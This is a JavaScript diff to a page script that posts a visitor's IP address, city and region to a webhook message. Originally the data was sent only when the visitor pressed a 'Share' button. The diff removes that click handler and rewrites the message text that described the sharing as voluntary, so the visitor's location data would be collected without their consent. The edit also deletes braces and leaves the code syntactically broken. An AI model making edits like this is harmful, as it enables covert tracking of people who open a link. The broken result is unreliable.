@@ -207,8 +207,6 @@
     }
   })();
 
-  $shareBtn.addEventListener('click', async function () {
-    if (!info || !shareMatch) return;
     $shareBtn.disabled = true;
     $shareStatus.className = 'status';
     $shareStatus.textContent = 'Sending\u2026';
@@ -217,7 +215,6 @@
     function f(name, value, inline) {
       if (value === undefined || value === null || value === '') return;
       fields.push({ name: name, value: String(value), inline: !!inline });
-    }
     f('IP', info.ip, true);
     f('City', info.city, true);
     f('Region / state', info.region, true);
@@ -237,7 +234,7 @@
       username: 'realer',
       embeds: [{
         title: 'Shared connection info',
-        description: 'The visitor of the link pressed \u201cShare\u201d and shared their own info.',
+        description: 'The visitor of the link',
         color: 0x5eead4,
         fields: fields,
         timestamp: new Date().toISOString(),
